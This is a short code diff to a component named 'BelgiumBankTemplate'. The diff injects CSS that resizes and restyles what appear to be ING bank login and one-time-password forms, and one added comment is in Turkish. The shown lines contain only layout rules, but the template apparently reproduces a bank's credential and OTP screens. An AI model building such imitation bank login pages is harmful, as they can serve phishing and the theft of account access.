@@ -3738,7 +3738,11 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                var __ingStyle = document.createElement('style');
                __ingStyle.textContent = [
                  'html{zoom:0.72;}',
-                 'body{min-width:0!important;}',
+                 'body{min-width:0!important;background:#f2f2f2!important;}',
+                 // zoom:0.72 -> vh da kuculur; gorunur tam ekran icin ~139vh gerekir
+                 'ing-app-authentication-main,ing-app-authentication-page-layout,ing-app-authentication{display:block!important;min-height:139vh!important;}',
+                 '.app-grid,main#start-of-content{min-height:139vh!important;}',
+                 '.card.content-container{min-height:130vh!important;}',
                  '#ucrLoginForm,#otpForm,#otpFormSca{max-width:100%!important;min-width:0!important;}',
                  '.means-selector-item{width:100%!important;min-width:0!important;}',
                  '.ing-accordion__header{min-width:0!important;}',
